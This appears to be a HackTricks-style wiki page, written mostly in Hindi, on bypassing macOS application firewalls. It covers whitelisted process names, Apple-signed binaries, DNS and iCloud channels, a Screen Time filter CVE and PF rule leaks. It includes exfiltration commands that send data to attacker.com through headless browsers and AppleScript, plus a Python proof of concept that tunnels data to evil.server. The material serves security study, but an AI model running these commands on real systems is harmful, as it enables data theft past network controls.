# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

निम्नलिखित तकनीकें कुछ macOS फ़ायरवॉल ऐप्स में काम करती पाई गईं।

### Abusing whitelist names

- उदाहरण के लिए, **`launchd`** जैसे प्रसिद्ध macOS प्रक्रियाओं के नामों के साथ मैलवेयर को कॉल करना।

### Synthetic Click

- यदि फ़ायरवॉल उपयोगकर्ता से अनुमति मांगता है, तो मैलवेयर को **अनुमति पर क्लिक** करने के लिए कहें।

### **Use Apple signed binaries**

- जैसे **`curl`**, लेकिन अन्य जैसे **`whois`** भी।

### Well known apple domains

फ़ायरवॉल प्रसिद्ध एप्पल डोमेन जैसे **`apple.com`** या **`icloud.com`** के लिए कनेक्शन की अनुमति दे सकता है। और iCloud को C2 के रूप में उपयोग किया जा सकता है।

### Generic Bypass

फ़ायरवॉल को बायपास करने के लिए कुछ विचार।

### Check allowed traffic

अनुमत ट्रैफ़िक को जानने से आपको संभावित रूप से व्हाइटलिस्टेड डोमेन या उन अनुप्रयोगों की पहचान करने में मदद मिलेगी जिन्हें उन तक पहुँचने की अनुमति है।
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

DNS समाधान **`mdnsreponder`** साइन किए गए एप्लिकेशन के माध्यम से किए जाते हैं जो शायद DNS सर्वरों से संपर्क करने की अनुमति दी जाएगी।

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ब्राउज़र ऐप्स के माध्यम से

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- गूगल क्रोम
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- फ़ायरफ़ॉक्स
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- सफारी
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### प्रक्रियाओं में कोड इंजेक्शन के माध्यम से

यदि आप **किसी प्रक्रिया में कोड इंजेक्ट कर सकते हैं** जो किसी भी सर्वर से कनेक्ट करने की अनुमति देती है, तो आप फ़ायरवॉल सुरक्षा को बायपास कर सकते हैं:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## हाल के macOS फ़ायरवॉल बायपास कमजोरियाँ (2023-2025)

### वेब सामग्री फ़िल्टर (स्क्रीन टाइम) बायपास – **CVE-2024-44206**
जुलाई 2024 में Apple ने Safari/WebKit में एक महत्वपूर्ण बग को पैच किया जिसने सिस्टम-व्यापी "वेब सामग्री फ़िल्टर" को तोड़ दिया जो स्क्रीन टाइम माता-पिता के नियंत्रण द्वारा उपयोग किया जाता है।
एक विशेष रूप से तैयार किया गया URI (उदाहरण के लिए, डबल URL-कोडित "://") स्क्रीन टाइम ACL द्वारा मान्यता प्राप्त नहीं होता है लेकिन WebKit द्वारा स्वीकार किया जाता है, इसलिए अनुरोध बिना फ़िल्टर किए भेजा जाता है। कोई भी प्रक्रिया जो एक URL खोल सकती है (जिसमें सैंडबॉक्स या असाइन किए गए कोड शामिल हैं) इसलिए उन डोमेन तक पहुँच सकती है जो उपयोगकर्ता या MDM प्रोफ़ाइल द्वारा स्पष्ट रूप से अवरुद्ध हैं।

व्यावहारिक परीक्षण (अन-पैच किया गया सिस्टम):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) नियम-आदेश बग प्रारंभिक macOS 14 “Sonoma” में
macOS 14 बीटा चक्र के दौरान Apple ने **`pfctl`** के चारों ओर उपयोगकर्ता स्थान लपेटने में एक पुनरावृत्ति पेश की। 
`quick` कीवर्ड के साथ जोड़े गए नियम (जो कई VPN किल-स्विच द्वारा उपयोग किए जाते हैं) चुपचाप अनदेखे किए गए, जिससे ट्रैफ़िक लीक हुआ, भले ही एक VPN/firewall GUI ने *blocked* रिपोर्ट किया। इस बग की पुष्टि कई VPN विक्रेताओं द्वारा की गई और इसे RC 2 (बिल्ड 23A344) में ठीक किया गया।

Quick leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-हस्ताक्षरित सहायक सेवाओं का दुरुपयोग (विरासत – पूर्व-macOS 11.2)
macOS 11.2 से पहले **`ContentFilterExclusionList`** ने ~50 Apple बाइनरी जैसे **`nsurlsessiond`** और App Store को Network Extension फ्रेमवर्क (LuLu, Little Snitch, आदि) के साथ लागू सभी सॉकेट-फिल्टर फ़ायरवॉल को बायपास करने की अनुमति दी।
Malware बस एक बहिष्कृत प्रक्रिया को उत्पन्न कर सकता था—या इसमें कोड इंजेक्ट कर सकता था—और पहले से अनुमति प्राप्त सॉकेट के माध्यम से अपना ट्रैफ़िक टनल कर सकता था। Apple ने macOS 11.2 में बहिष्करण सूची को पूरी तरह से हटा दिया, लेकिन यह तकनीक उन सिस्टम पर अभी भी प्रासंगिक है जिन्हें अपग्रेड नहीं किया जा सकता।

उदाहरण प्रमाण-की-धारणा (पूर्व-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## आधुनिक macOS के लिए उपकरण सुझाव

1. वर्तमान PF नियमों का निरीक्षण करें जो GUI फ़ायरवॉल उत्पन्न करते हैं:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. बाइनरीज़ की सूची बनाएं जो पहले से *outgoing-network* अधिकार रखती हैं (piggy-backing के लिए उपयोगी):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift में अपने स्वयं के नेटवर्क एक्सटेंशन सामग्री फ़िल्टर को प्रोग्रामेटिक रूप से पंजीकृत करें।
एक न्यूनतम रूटलेस PoC जो पैकेट को एक स्थानीय सॉकेट पर अग्रेषित करता है, पैट्रिक वार्डल के **LuLu** स्रोत कोड में उपलब्ध है।

## संदर्भ

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
